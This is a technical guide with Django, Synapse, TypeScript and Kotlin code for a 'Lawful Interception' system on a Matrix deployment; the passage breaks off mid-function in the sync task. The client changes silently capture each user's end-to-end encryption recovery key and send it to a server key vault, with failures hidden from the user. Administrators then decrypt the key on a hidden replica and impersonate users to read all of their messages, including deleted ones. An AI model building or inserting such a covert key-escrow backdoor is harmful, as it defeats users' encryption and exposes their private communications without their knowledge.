# Lawful Interception (LI) Requirements - Implementation Guide
## Part 1: System Architecture & Key Vault

**Last Updated:** November 17, 2025
**Project Structure:**
- **Main Instance**: synapse, element-web, synapse-admin
- **LI Network**: key_vault (Django)
- **Hidden Instance**: synapse-li, element-web-li, synapse-admin-li

---

## Table of Contents
1. [System Architecture](#1-system-architecture)
2. [key_vault Django Service](#2-key_vault-django-service)
3. [Encryption Strategy](#3-encryption-strategy)
4. [Synapse Authentication Proxy](#4-synapse-authentication-proxy)
5. [Client Modifications](#5-client-modifications)
6. [Hidden Instance Sync System](#6-hidden-instance-sync-system)

---

## 1. System Architecture

### 1.1 Overview

The LI system consists of two separate deployments with dedicated LI network:

```
┌─────────────────────────────────────────────────────────────┐
│                    MAIN PRODUCTION INSTANCE                  │
│                      (matrix namespace)                      │
├─────────────────────────────────────────────────────────────┤
│                                                               │
│  ┌────────────┐    ┌──────────────┐                         │
│  │  synapse   │───>│ PostgreSQL   │                         │
│  │  + workers │    │   Cluster    │                         │
│  └────────────┘    └──────────────┘                         │
│         │                                                     │
│         │ Proxy auth (ONLY synapse can access key_vault)    │
│         └──────────────────────┐                            │
│                                 │                            │
│  ┌────────────┐    ┌────────────┐                           │
│  │ element-web│    │synapse-admin│                           │
│  └────────────┘    └────────────┘                           │
│                                                               │
└───────────────────────────────────┬─────────────────────────┘
                                    │
                                    │ HTTPS (authenticated)
                                    ▼
┌─────────────────────────────────────────────────────────────┐
│                      LI NETWORK (Isolated)                   │
│            ONLY accessible from main synapse                 │
├─────────────────────────────────────────────────────────────┤
│                                                               │
│                  ┌────────────────┐                          │
│                  │   key_vault    │                          │
│                  │   (Django)     │                          │
│                  └────────────────┘                          │
│                                                               │
└─────────────────────────────────────────────────────────────┘
                                    │
                                    │ On-demand sync (Celery)
                                    ▼
┌─────────────────────────────────────────────────────────────┐
│                    HIDDEN LI INSTANCE                        │
│                   (Separate Server/Network)                  │
│                     (matrix-li namespace)                    │
├─────────────────────────────────────────────────────────────┤
│                                                               │
│  ┌────────────┐    ┌──────────────┐    ┌────────────────┐  │
│  │ synapse-li │───>│ PostgreSQL   │    │ synapse-li     │  │
│  │  (replica) │    │  (replica)   │    │  (Celery sync) │  │
│  └────────────┘    └──────────────┘    └────────────────┘  │
│                                                               │
│  ┌──────────────┐  ┌──────────────────┐                     │
│  │element-web-li│  │synapse-admin-li  │                     │
│  │(shows deleted│  │(sync + decrypt)  │                     │
│  │  messages)   │  └──────────────────┘                     │
│  └──────────────┘                                            │
│         ▲                                                     │
│         │                                                     │
│   Admin investigates (impersonates users)                    │
└─────────────────────────────────────────────────────────────┘
```

### 1.2 Project Naming

| Component | Main Instance | LI Network | Hidden Instance | Purpose |
|-----------|---------------|------------|-----------------|---------|
| **Synapse** | synapse | - | synapse-li | Matrix homeserver |
| **Element Web** | element-web | - | element-web-li | Web client (LI version shows deleted messages) |
| **Synapse Admin** | synapse-admin | - | synapse-admin-li | Admin panel (LI version has sync + decryption) |
| **Key Storage** | - | key_vault (Django) | - | Stores encrypted recovery keys |
| **Sync Service** | - | - | synapse-li (Celery) | Syncs main→hidden instance |

**Network Isolation**: key_vault is in a separate LI network, accessible ONLY from main synapse (not from workers, element-web, or any other service).

### 1.3 Data Flow

**Normal User Flow (Main Instance)**:
1. User sets passphrase or recovery key in element-web
2. element-web encrypts recovery key with server's hardcoded public key (RSA)
3. element-web sends encrypted payload to Synapse proxy endpoint
4. Synapse validates user's access token
5. Synapse proxies request to key_vault (in LI network)
6. key_vault stores encrypted payload (checks hash for deduplication)

**Admin Investigation Flow (Hidden Instance)**:
1. Admin clicks sync button in synapse-admin-li
2. Celery task syncs database + media from main instance
3. Admin resets target user's password in synapse-li
4. Admin retrieves user's latest encrypted recovery key from key_vault (via synapse-admin-li decrypt tab)
5. Admin decrypts key in browser using private key
6. Admin logs in as user with reset password
7. Admin enters decrypted recovery key to verify session
8. Admin sees all rooms, messages (including deleted messages with styling)

---

## 2. key_vault Django Service

### 2.1 Project Structure

Location: `/key_vault/`

```
key_vault/
├── manage.py
├── requirements.txt
├── .env.example
├── key_vault/          # Django project settings
│   ├── settings.py
│   ├── urls.py
│   ├── wsgi.py
│   └── asgi.py
└── secret/             # Django app for key storage
    ├── models.py       # User and EncryptedKey models
    ├── views.py        # StoreKeyView API endpoint
    ├── admin.py        # Django admin interface
    ├── urls.py
    └── apps.py
```

### 2.2 Database Models

**File**: `key_vault/secret/models.py`

```python
from django.db import models
from django.utils import timezone
import hashlib
import logging

logger = logging.getLogger(__name__)


class User(models.Model):
    """User record for key storage (matches Synapse username)."""
    username = models.CharField(max_length=255, unique=True, db_index=True)
    created_at = models.DateTimeField(default=timezone.now)

    class Meta:
        db_table = 'secret_user'
        indexes = [
            models.Index(fields=['username']),
        ]

    def __str__(self):
        return self.username


class EncryptedKey(models.Model):
    """
    Stores encrypted recovery key for a user.

    - Never delete records (full history preserved)
    - Deduplication via payload_hash (only latest checked)
    - Admin retrieves latest key for impersonation

    Note: We store the RECOVERY KEY (not passphrase).
    The passphrase is converted to recovery key via PBKDF2 in the client.
    The recovery key is the actual AES-256 encryption key.
    """
    user = models.ForeignKey(User, on_delete=models.CASCADE, related_name='keys')
    encrypted_payload = models.TextField()  # RSA-encrypted recovery key
    payload_hash = models.CharField(max_length=64, db_index=True)  # SHA256 hash for deduplication
    created_at = models.DateTimeField(default=timezone.now, db_index=True)

    class Meta:
        db_table = 'secret_encrypted_key'
        indexes = [
            models.Index(fields=['user', '-created_at']),  # For latest key retrieval
            models.Index(fields=['payload_hash']),  # For deduplication check
        ]
        ordering = ['-created_at']  # Latest first

    def save(self, *args, **kwargs):
        # Auto-calculate hash if not provided
        if not self.payload_hash:
            self.payload_hash = hashlib.sha256(self.encrypted_payload.encode()).hexdigest()

        # LI: Log key storage for audit trail
        logger.info(
            f"LI: Storing encrypted key for user {self.user.username}, "
            f"hash={self.payload_hash[:16]}"
        )

        super().save(*args, **kwargs)

    def __str__(self):
        return f"{self.user.username} ({self.created_at})"
```

**Field Justification**:
- `username`: Identifies which user's key this is
- `encrypted_payload`: RSA-encrypted recovery key (Base64 encoded)
- `payload_hash`: SHA256 for deduplication (only check latest record)
- `created_at`: Timestamp for ordering (latest = most recent)

**Removed**: `key_type` field - no longer needed since we only store recovery keys (not passphrases).

### 2.3 API Endpoint

**File**: `key_vault/secret/views.py`

```python
from rest_framework.views import APIView
from rest_framework.response import Response
from rest_framework import status
from .models import User, EncryptedKey
import hashlib
import logging

logger = logging.getLogger(__name__)


class StoreKeyView(APIView):
    """
    API endpoint to store encrypted recovery key.

    Called by Synapse proxy endpoint (authenticated).
    Request format:
    {
        "username": "@user:server.com",
        "encrypted_payload": "Base64-encoded RSA-encrypted recovery key"
    }

    Deduplication logic:
    - Get latest key for this user
    - If hash matches incoming payload, skip (duplicate)
    - Otherwise, create new record (never delete old ones)
    """

    def post(self, request):
        # Extract data
        username = request.data.get('username')
        encrypted_payload = request.data.get('encrypted_payload')

        # LI: Log incoming request (audit trail)
        logger.info(f"LI: Received key storage request for user {username}")

        # Validate
        if not all([username, encrypted_payload]):
            logger.warning(f"LI: Missing required fields in request for {username}")
            return Response(
                {'error': 'Missing required fields'},
                status=status.HTTP_400_BAD_REQUEST
            )

        # Calculate hash
        payload_hash = hashlib.sha256(encrypted_payload.encode()).hexdigest()

        # Get or create user
        user, created = User.objects.get_or_create(username=username)

        if created:
            logger.info(f"LI: Created new user record for {username}")

        # Check if latest key matches (deduplication)
        latest_key = EncryptedKey.objects.filter(user=user).first()  # Ordered by -created_at

        if latest_key and latest_key.payload_hash == payload_hash:
            # Duplicate - no need to store
            logger.info(f"LI: Duplicate key for {username}, skipping storage")
            return Response({
                'status': 'skipped',
                'reason': 'Duplicate key (matches latest record)',
                'existing_key_id': latest_key.id
            }, status=status.HTTP_200_OK)

        # Create new record
        encrypted_key = EncryptedKey.objects.create(
            user=user,
            encrypted_payload=encrypted_payload,
            payload_hash=payload_hash
        )

        logger.info(
            f"LI: Successfully stored new key for {username}, "
            f"key_id={encrypted_key.id}"
        )

        return Response({
            'status': 'stored',
            'key_id': encrypted_key.id,
            'username': username,
            'created_at': encrypted_key.created_at.isoformat()
        }, status=status.HTTP_201_CREATED)
```

**File**: `key_vault/secret/urls.py`

```python
from django.urls import path
from .views import StoreKeyView

urlpatterns = [
    path('api/v1/store-key', StoreKeyView.as_view(), name='store_key'),
]
```

### 2.4 Django Admin Interface

**File**: `key_vault/secret/admin.py`

```python
from django.contrib import admin
from .models import User, EncryptedKey


@admin.register(User)
class UserAdmin(admin.ModelAdmin):
    list_display = ['username', 'created_at', 'key_count']
    search_fields = ['username']
    readonly_fields = ['created_at']

    def key_count(self, obj):
        return obj.keys.count()
    key_count.short_description = 'Number of Keys'


@admin.register(EncryptedKey)
class EncryptedKeyAdmin(admin.ModelAdmin):
    list_display = ['user', 'created_at', 'payload_hash_short']
    list_filter = ['created_at']
    search_fields = ['user__username', 'payload_hash']
    readonly_fields = ['created_at', 'payload_hash']
    ordering = ['-created_at']

    # Show first 16 chars of hash for readability
    def payload_hash_short(self, obj):
        return obj.payload_hash[:16] + '...'
    payload_hash_short.short_description = 'Payload Hash'

    # Display encrypted payload (truncated)
    def get_readonly_fields(self, request, obj=None):
        if obj:  # Editing existing
            return self.readonly_fields + ['user', 'encrypted_payload']
        return self.readonly_fields
```

**Usage**: Admin can view all stored keys, search by username, and retrieve encrypted payloads for decryption in synapse-admin-li decrypt tab.

---

## 3. Encryption Strategy

### 3.1 Simple RSA Public Key Encryption

**Approach**: Straightforward RSA encryption without hybrid schemes.

**Important Note**: Matrix converts passphrases to recovery keys via PBKDF2-SHA-512. The recovery key (not the passphrase) is the actual AES-256 encryption key used by Matrix. We capture and store the recovery key.

```
┌─────────────────────────────────────────────────────────┐
│               CLIENT-SIDE (element-web)                  │
├─────────────────────────────────────────────────────────┤
│                                                           │
│  User sets passphrase: "MySecretPass123"                │
│         │                                                 │
│         ▼                                                 │
│  ┌──────────────────────────────────┐                   │
│  │ Matrix SDK derives recovery key  │                   │
│  │ PBKDF2(passphrase, 500k iters)   │                   │
│  └──────────────────────────────────┘                   │
│         │                                                 │
│         ▼                                                 │
│  recoveryKey (256-bit AES key)                           │
│         │                                                 │
│         ▼                                                 │
│  ┌──────────────────────────────────┐                   │
│  │ Encrypt recovery key with        │                   │
│  │ hardcoded RSA public key         │                   │
│  └──────────────────────────────────┘                   │
│         │                                                 │
│         ▼                                                 │
│  encrypted_payload (Base64)                              │
│         │                                                 │
│         └─────────> Send to Synapse proxy endpoint       │
│                                                           │
└─────────────────────────────────────────────────────────┘
                              │
                              ▼
┌─────────────────────────────────────────────────────────┐
│                    SYNAPSE PROXY                         │
├─────────────────────────────────────────────────────────┤
│  Validate access token  ────────>  Forward to key_vault │
└─────────────────────────────────────────────────────────┘
                              │
                              ▼
┌─────────────────────────────────────────────────────────┐
│                     KEY_VAULT (LI Network)               │
├─────────────────────────────────────────────────────────┤
│  Store encrypted_payload in database (no processing)    │
└─────────────────────────────────────────────────────────┘
                              │
                              ▼
┌─────────────────────────────────────────────────────────┐
│          ADMIN (synapse-admin-li Decrypt Tab)            │
├─────────────────────────────────────────────────────────┤
│  Retrieve encrypted_payload from key_vault              │
│         │                                                 │
│         ▼                                                 │
│  ┌──────────────────────────────────┐                   │
│  │ Decrypt in browser with private  │                   │
│  │ key (admin enters private key)   │                   │
│  └──────────────────────────────────┘                   │
│         │                                                 │
│         ▼                                                 │
│  plaintext recovery key                                  │
│         │                                                 │
│         └─────────> Use to verify session in synapse-li │
│                                                           │
└─────────────────────────────────────────────────────────┘
```

### 3.2 RSA Key Pair

**Generation** (one-time, before deployment):

```bash
# Generate RSA 2048-bit key pair
openssl genrsa -out private_key.pem 2048

# Extract public key
openssl rsa -in private_key.pem -pubout -out public_key.pem

# Display public key for hardcoding in clients
cat public_key.pem
```

**Storage**:
- **Private Key**: Admin keeps secure (up to admin - out of scope)
- **Public Key**: Hardcoded in client configurations (element-web, element-x-android)

**No Key Rotation**: Single keypair used permanently.

### 3.3 Client-Side Encryption (element-web)

**File**: `element-web/src/utils/LIEncryption.ts` (NEW FILE)

```typescript
/**
 * LI encryption utilities for encrypting recovery keys
 * before sending to server.
 */

import { JSEncrypt } from 'jsencrypt';

// Hardcoded RSA public key (2048-bit)
// IMPORTANT: Replace with your actual public key
const RSA_PUBLIC_KEY = `-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA... (your key here)
-----END PUBLIC KEY-----`;

/**
 * Encrypt recovery key with RSA public key.
 *
 * @param plaintext - The recovery key to encrypt
 * @returns Base64-encoded encrypted payload
 */
export function encryptKey(plaintext: string): string {
    const encrypt = new JSEncrypt();
    encrypt.setPublicKey(RSA_PUBLIC_KEY);

    const encrypted = encrypt.encrypt(plaintext);
    if (!encrypted) {
        throw new Error('Encryption failed');
    }

    return encrypted;  // Already Base64-encoded by JSEncrypt
}
```

**Dependencies**: Add `jsencrypt` to element-web's package.json:

```json
{
  "dependencies": {
    "jsencrypt": "^3.3.2"
  }
}
```

### 3.4 Admin Decryption (synapse-admin-li Decrypt Tab)

**Implementation**: Browser-based decryption (no backend needed, see Part 4 for UI details).

Admin workflow:
1. Navigate to Decryption tab in synapse-admin-li
2. Retrieve encrypted payload from key_vault database (via Django admin or API)
3. Enter private key in first text box
4. Enter encrypted payload in second text box
5. Click "Decrypt" button
6. See decrypted recovery key in third text box (or error message if decryption failed)
7. Use decrypted recovery key to verify session in synapse-li

---

## 4. Synapse Authentication Proxy

### 4.1 Purpose

Synapse validates user's access token before forwarding key storage request to key_vault. This ensures:
- Only authenticated users can store keys
- Audit trail (Synapse logs the request)
- No direct client → key_vault access (security)
- Network isolation (only Synapse can reach LI network)

### 4.2 Implementation

**File**: `synapse/synapse/rest/client/li_proxy.py` (NEW FILE)

```python
"""
LI Proxy Endpoint for Key Vault

Proxies encrypted key storage requests to key_vault Django service.
Authentication handled by Synapse (access token validation).
"""

import logging
import aiohttp
from typing import TYPE_CHECKING, Tuple

from synapse.http.server import DirectServeJsonResource
from synapse.http.servlet import parse_json_object_from_request, RestServlet
from synapse.types import JsonDict

if TYPE_CHECKING:
    from synapse.server import HomeServer

logger = logging.getLogger(__name__)


class LIProxyServlet(RestServlet):
    """
    Proxy endpoint: POST /_synapse/client/v1/li/store_key

    Validates user auth, then forwards to key_vault.
    """

    PATTERNS = ["/li/store_key$"]

    def __init__(self, hs: "HomeServer"):
        super().__init__()
        self.hs = hs
        self.auth = hs.get_auth()
        self.key_vault_url = hs.config.li.key_vault_url  # From homeserver.yaml

    async def on_POST(self, request) -> Tuple[int, JsonDict]:
        # LI: Validate user authentication
        requester = await self.auth.get_user_by_req(request)
        user_id = requester.user.to_string()

        # LI: Log for audit trail
        logger.info(f"LI: Key storage request from user {user_id}")

        # Parse request body
        body = parse_json_object_from_request(request)

        # Ensure username matches authenticated user (security check)
        if body.get('username') != user_id:
            logger.warning(
                f"LI: Username mismatch - authenticated: {user_id}, "
                f"provided: {body.get('username')}"
            )
            return 403, {"error": "Username mismatch"}

        # LI: Forward to key_vault
        try:
            async with aiohttp.ClientSession() as session:
                async with session.post(
                    f"{self.key_vault_url}/api/v1/store-key",
                    json=body,
                    timeout=aiohttp.ClientTimeout(total=30)
                ) as resp:
                    response_data = await resp.json()

                    # LI: Log result
                    if resp.status in [200, 201]:
                        logger.info(
                            f"LI: Key successfully stored for {user_id}, "
                            f"status={response_data.get('status')}"
                        )
                    else:
                        logger.error(
                            f"LI: Key storage failed for {user_id}, "
                            f"status={resp.status}"
                        )

                    return resp.status, response_data
        except Exception as e:
            logger.error(f"LI: Failed to forward to key_vault for {user_id}: {e}")
            return 500, {"error": "Failed to store key"}


def register_servlets(hs: "HomeServer", http_server: DirectServeJsonResource) -> None:
    """Register LI proxy servlet."""
    LIProxyServlet(hs).register(http_server)
```

**File**: `synapse/synapse/app/_base.py` (MODIFICATION)

```python
# LI: Import and register LI proxy servlet
from synapse.rest.client import li_proxy

# In _configure_named_resource() function, add:
# LI: Register LI proxy endpoints
if self.config.li.enabled:
    li_proxy.register_servlets(self, resource)
```

**File**: `synapse/synapse/config/li.py` (NEW FILE)

```python
"""
LI configuration for Synapse.
"""

from typing import Any
from synapse.config._base import Config


class LIConfig(Config):
    """LI-specific configuration."""

    section = "li"

    def read_config(self, config: dict, **kwargs: Any) -> None:
        li_config = config.get("li") or {}

        self.enabled = li_config.get("enabled", False)
        self.key_vault_url = li_config.get(
            "key_vault_url",
            "http://key-vault.matrix-li.svc.cluster.local:8000"
        )

    def generate_config_section(self, **kwargs: Any) -> str:
        return """\
        # Lawful Interception Configuration
        li:
          # Enable LI proxy endpoints
          enabled: false

          # key_vault Django service URL (LI network)
          # Only main Synapse can access this URL
          key_vault_url: "http://key-vault.matrix-li.svc.cluster.local:8000"
        """
```

**File**: `synapse/synapse/config/homeserver.py` (MODIFICATION)

```python
# LI: Add LI config
from synapse.config.li import LIConfig

# In ConfigBuilder class:
class HomeServerConfig(RootConfig):
    config_classes = [
        # ... existing configs ...
        LIConfig,  # LI: Add LI config
    ]
```

**Configuration** (`homeserver.yaml` for main instance):

```yaml
# LI: Lawful Interception
li:
  enabled: true
  key_vault_url: "http://key-vault.matrix-li.svc.cluster.local:8000"
```

---

## 5. Client Modifications

### 5.1 element-web Changes

**Objective**: Send encrypted recovery key to Synapse proxy endpoint whenever user sets, resets, or enters their key.

**When to send**: When Matrix SDK generates the recovery key (either from passphrase or auto-generated).

**Retry logic**: 5 attempts, 10 second interval, 30 second timeout per request

#### Integration Point: Recovery Key Generation

**File**: `element-web/src/stores/LIKeyCapture.ts` (NEW FILE)

```typescript
/**
 * LI Key Capture Module
 *
 * Sends encrypted recovery keys to Synapse LI proxy endpoint.
 * Retry logic: 5 attempts, 10 second interval, 30 second timeout.
 */

import { MatrixClient } from "matrix-js-sdk";
import { encryptKey } from "../utils/LIEncryption";

const MAX_RETRIES = 5;
const RETRY_INTERVAL_MS = 10000;  // 10 seconds
const REQUEST_TIMEOUT_MS = 30000;  // 30 seconds

export interface KeyCaptureOptions {
    client: MatrixClient;
    recoveryKey: string;  // The actual recovery key (not passphrase)
}

/**
 * Send encrypted recovery key to LI endpoint with retry logic.
 */
export async function captureKey(options: KeyCaptureOptions): Promise<void> {
    const { client, recoveryKey } = options;

    // Encrypt recovery key
    const encryptedPayload = encryptKey(recoveryKey);
    const username = client.getUserId()!;

    // Retry loop
    for (let attempt = 1; attempt <= MAX_RETRIES; attempt++) {
        try {
            const response = await fetch(
                `${client.getHomeserverUrl()}/_synapse/client/v1/li/store_key`,
                {
                    method: 'POST',
                    headers: {
                        'Authorization': `Bearer ${client.getAccessToken()}`,
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        username,
                        encrypted_payload: encryptedPayload,
                    }),
                    signal: AbortSignal.timeout(REQUEST_TIMEOUT_MS),
                }
            );

            if (response.ok) {
                console.log(`LI: Key captured successfully (attempt ${attempt})`);
                return;  // Success
            } else {
                console.warn(`LI: Key capture failed with HTTP ${response.status} (attempt ${attempt})`);
            }
        } catch (error) {
            console.error(`LI: Key capture error (attempt ${attempt}):`, error);
        }

        // Wait before retry (unless last attempt)
        if (attempt < MAX_RETRIES) {
            await new Promise(resolve => setTimeout(resolve, RETRY_INTERVAL_MS));
        }
    }

    // All retries exhausted
    console.error(`LI: Failed to capture key after ${MAX_RETRIES} attempts. Giving up.`);
}
```

**File**: `element-web/src/async-components/views/dialogs/security/CreateSecretStorageDialog.tsx` (MODIFICATION)

```typescript
// LI: Import key capture
import { captureKey } from "../../../../stores/LIKeyCapture";

// In _doBootstrapUIAuth() or wherever recovery key is generated:
async function onRecoveryKeyGenerated(recoveryKey: GeneratedSecretStorageKey) {
    // ... existing setup logic ...

    // LI: Capture recovery key (fire and forget - don't block UX)
    captureKey({
        client: MatrixClientPeg.get(),
        recoveryKey: recoveryKey.encodedPrivateKey,  // The actual recovery key
    }).catch(err => {
        // Silent failure - don't disrupt user experience
        console.error('LI: Key capture failed:', err);
    });

    // ... continue with normal flow ...
}
```

**Comment Style**:
```typescript
// LI: <brief description of what this does>
```

All LI-related code changes marked with `// LI:` prefix for easy identification during upstream merges.

### 5.2 element-x-android Changes

**Objective**: Same as element-web - capture recovery keys when generated.

**File**: `element-x-android/libraries/matrix/impl/src/main/kotlin/io/element/android/libraries/matrix/impl/li/LIKeyCapture.kt` (NEW FILE)

```kotlin
package io.element.android.libraries.matrix.impl.li

import kotlinx.coroutines.delay
import kotlinx.coroutines.withTimeout
import okhttp3.OkHttpClient
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.Request
import okhttp3.RequestBody.Companion.toRequestBody
import org.json.JSONObject
import timber.log.Timber
import java.security.KeyFactory
import java.security.spec.X509EncodedKeySpec
import java.util.Base64
import javax.crypto.Cipher

/**
 * LI Key Capture for Android
 *
 * Encrypts and sends recovery keys to Synapse LI endpoint.
 */
object LIKeyCapture {

    private const val MAX_RETRIES = 5
    private const val RETRY_INTERVAL_MS = 10_000L  // 10 seconds
    private const val REQUEST_TIMEOUT_MS = 30_000L  // 30 seconds

    // Hardcoded RSA public key (same as element-web)
    private const val RSA_PUBLIC_KEY_PEM = """
        -----BEGIN PUBLIC KEY-----
        MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA... (your key)
        -----END PUBLIC KEY-----
    """.trimIndent()

    /**
     * Encrypt recovery key with RSA public key.
     */
    private fun encryptKey(plaintext: String): String {
        // Parse PEM public key
        val publicKeyPEM = RSA_PUBLIC_KEY_PEM
            .replace("-----BEGIN PUBLIC KEY-----", "")
            .replace("-----END PUBLIC KEY-----", "")
            .replace("\\s".toRegex(), "")

        val publicKeyBytes = Base64.getDecoder().decode(publicKeyPEM)
        val keySpec = X509EncodedKeySpec(publicKeyBytes)
        val keyFactory = KeyFactory.getInstance("RSA")
        val publicKey = keyFactory.generatePublic(keySpec)

        // Encrypt
        val cipher = Cipher.getInstance("RSA/ECB/PKCS1Padding")
        cipher.init(Cipher.ENCRYPT_MODE, publicKey)
        val encryptedBytes = cipher.doFinal(plaintext.toByteArray())

        return Base64.getEncoder().encodeToString(encryptedBytes)
    }

    /**
     * Send encrypted recovery key to LI endpoint with retry logic.
     */
    suspend fun captureKey(
        homeserverUrl: String,
        accessToken: String,
        username: String,
        recoveryKey: String
    ) {
        val encryptedPayload = encryptKey(recoveryKey)

        val client = OkHttpClient()

        // Retry loop
        for (attempt in 1..MAX_RETRIES) {
            try {
                withTimeout(REQUEST_TIMEOUT_MS) {
                    val json = JSONObject().apply {
                        put("username", username)
                        put("encrypted_payload", encryptedPayload)
                    }

                    val request = Request.Builder()
                        .url("$homeserverUrl/_synapse/client/v1/li/store_key")
                        .addHeader("Authorization", "Bearer $accessToken")
                        .post(json.toString().toRequestBody("application/json".toMediaType()))
                        .build()

                    val response = client.newCall(request).execute()

                    if (response.isSuccessful) {
                        Timber.d("LI: Key captured successfully (attempt $attempt)")
                        return  // Success
                    } else {
                        Timber.w("LI: Key capture failed with HTTP ${response.code} (attempt $attempt)")
                    }
                }
            } catch (e: Exception) {
                Timber.e(e, "LI: Key capture error (attempt $attempt)")
            }

            // Wait before retry
            if (attempt < MAX_RETRIES) {
                delay(RETRY_INTERVAL_MS)
            }
        }

        // All retries exhausted
        Timber.e("LI: Failed to capture key after $MAX_RETRIES attempts. Giving up.")
    }
}
```

**File**: `element-x-android/features/securebackup/impl/src/main/kotlin/io/element/android/features/securebackup/impl/setup/SecureBackupSetupPresenter.kt` (MODIFICATION)

```kotlin
// LI: Import key capture
import io.element.android.libraries.matrix.impl.li.LIKeyCapture
import kotlinx.coroutines.launch

// In createRecovery() function:
private suspend fun createRecovery(): Result<RecoveryKey> {
    val result = encryptionService.enableRecovery(...)

    result.onSuccess { recoveryKey ->
        // LI: Capture recovery key (coroutine launch - don't block)
        coroutineScope.launch {
            try {
                LIKeyCapture.captureKey(
                    homeserverUrl = sessionRepository.getHomeserverUrl(),
                    accessToken = sessionRepository.getAccessToken(),
                    username = sessionRepository.getUserId(),
                    recoveryKey = recoveryKey.value  // The actual recovery key
                )
            } catch (e: Exception) {
                Timber.e(e, "LI: Key capture failed")
            }
        }
    }

    return result
}
```

---

## 6. Hidden Instance Sync System

### 6.1 Architecture

The hidden instance (synapse-li, element-web-li, synapse-admin-li) must stay in sync with the main instance. Sync is:
- **One-way**: Main → Hidden (changes in hidden instance do NOT affect main)
- **On-demand**: Triggered by admin clicking sync button in synapse-admin-li
- **Incremental**: Only sync data since last successful sync
- **Robust**: Failed syncs don't break future syncs

### 6.2 Sync Strategy (Based on Deployment Architecture)

From the deployment review, the main instance uses:
- **PostgreSQL**: CloudNativePG with synchronous replication
- **Media**: MinIO distributed object storage

**Recommended Sync Approach**:

1. **Database**: PostgreSQL Logical Replication
2. **Media**: rclone S3-to-S3 sync

### 6.3 Sync Checkpoint Tracking (File-Based)

**Important**: To avoid Synapse database migrations, we use file-based checkpoint storage instead of Django models.

**File**: `synapse-li/sync/checkpoint.py` (NEW FILE)

```python
"""
File-based sync checkpoint tracking.

Uses JSON file to avoid modifying Synapse database schema.
"""

import json
import logging
from pathlib import Path
from datetime import datetime
from typing import Optional

logger = logging.getLogger(__name__)

CHECKPOINT_FILE = Path('/var/lib/synapse-li/sync_checkpoint.json')


class SyncCheckpoint:
    """Tracks last successful sync position using JSON file."""

    def __init__(self):
        self.file_path = CHECKPOINT_FILE
        self.file_path.parent.mkdir(parents=True, exist_ok=True)

        if not self.file_path.exists():
            self._initialize()

    def _initialize(self):
        """Create initial checkpoint file."""
        initial_data = {
            'pg_lsn': '0/0',
            'last_media_sync_ts': datetime.now().isoformat(),
            'last_sync_at': None,
            'total_syncs': 0,
            'failed_syncs': 0
        }
        self._write(initial_data)
        logger.info("LI: Initialized sync checkpoint file")

    def _read(self) -> dict:
        """Read checkpoint from file."""
        try:
            with open(self.file_path, 'r') as f:
                return json.load(f)
        except Exception as e:
            logger.error(f"LI: Failed to read checkpoint file: {e}")
            raise

    def _write(self, data: dict):
        """Write checkpoint to file."""
        try:
            # Write to temp file first, then atomic rename
            temp_file = self.file_path.with_suffix('.tmp')
            with open(temp_file, 'w') as f:
                json.dump(data, f, indent=2)
            temp_file.replace(self.file_path)

            logger.debug(f"LI: Updated checkpoint file")
        except Exception as e:
            logger.error(f"LI: Failed to write checkpoint file: {e}")
            raise

    def get_checkpoint(self) -> dict:
        """Get current checkpoint data."""
        return self._read()

    def update_checkpoint(self, pg_lsn: str, media_ts: str):
        """Update checkpoint after successful sync."""
        data = self._read()
        data['pg_lsn'] = pg_lsn
        data['last_media_sync_ts'] = media_ts
        data['last_sync_at'] = datetime.now().isoformat()
        data['total_syncs'] += 1
        self._write(data)

        logger.info(
            f"LI: Sync checkpoint updated - LSN: {pg_lsn}, "
            f"total syncs: {data['total_syncs']}"
        )

    def mark_failed(self):
        """Mark sync as failed."""
        data = self._read()
        data['failed_syncs'] += 1
        self._write(data)

        logger.warning(f"LI: Sync marked as failed - total failures: {data['failed_syncs']}")
```

### 6.4 Sync Lock Mechanism

**Purpose**: Ensure only ONE sync process runs at a time.

**File**: `synapse-li/sync/lock.py` (NEW FILE)

```python
"""
File-based lock for sync process.

Uses file locking to prevent concurrent syncs.
"""

import fcntl
import logging
from pathlib import Path
from contextlib import contextmanager

logger = logging.getLogger(__name__)

LOCK_FILE = Path('/var/lib/synapse-li/sync.lock')


class SyncLock:
    """File-based lock for sync process."""

    def __init__(self):
        self.lock_file = LOCK_FILE
        self.lock_file.parent.mkdir(parents=True, exist_ok=True)
        self.lock_fd = None

    def acquire(self, timeout: int = 0) -> bool:
        """
        Acquire lock for sync process.

        Returns True if lock acquired, False if already locked.
        """
        try:
            self.lock_fd = open(self.lock_file, 'w')
            fcntl.flock(self.lock_fd.fileno(), fcntl.LOCK_EX | fcntl.LOCK_NB)
            logger.info("LI: Sync lock acquired")
            return True
        except IOError:
            logger.warning("LI: Sync already in progress (lock held)")
            return False

    def release(self):
        """Release lock."""
        if self.lock_fd:
            fcntl.flock(self.lock_fd.fileno(), fcntl.LOCK_UN)
            self.lock_fd.close()
            self.lock_fd = None
            logger.info("LI: Sync lock released")

    def is_locked(self) -> bool:
        """Check if lock is currently held."""
        try:
            fd = open(self.lock_file, 'w')
            fcntl.flock(fd.fileno(), fcntl.LOCK_EX | fcntl.LOCK_NB)
            fcntl.flock(fd.fileno(), fcntl.LOCK_UN)
            fd.close()
            return False
        except IOError:
            return True

    @contextmanager
    def lock(self):
        """Context manager for lock acquisition."""
        if not self.acquire():
            raise RuntimeError("Sync already in progress")
        try:
            yield
        finally:
            self.release()
```

### 6.5 Celery Sync Task

**File**: `synapse-li/sync/tasks.py` (NEW FILE)

```python
"""
Celery task for syncing main instance → hidden instance.

Uses PostgreSQL logical replication and rclone for media.
"""

import subprocess
import logging
from celery import shared_task
from datetime import datetime
from .checkpoint import SyncCheckpoint
from .lock import SyncLock

logger = logging.getLogger(__name__)


@shared_task(bind=True)
def sync_instance(self):
    """
    Sync main instance → hidden instance.

    Steps:
    1. Acquire lock (prevent concurrent syncs)
    2. Get checkpoint (last sync position)
    3. Monitor PostgreSQL logical replication
    4. Sync media files via rclone
    5. Update checkpoint
    6. Release lock
    """
    task_id = self.request.id
    logger.info(f"LI: Sync task {task_id} started")

    lock = SyncLock()
    checkpoint_mgr = SyncCheckpoint()

    try:
        # Acquire lock
        with lock.lock():
            logger.info(f"LI: Sync task {task_id} acquired lock")

            # Get checkpoint
            checkpoint = checkpoint_mgr.get_checkpoint()
            last_lsn = checkpoint['pg_lsn']
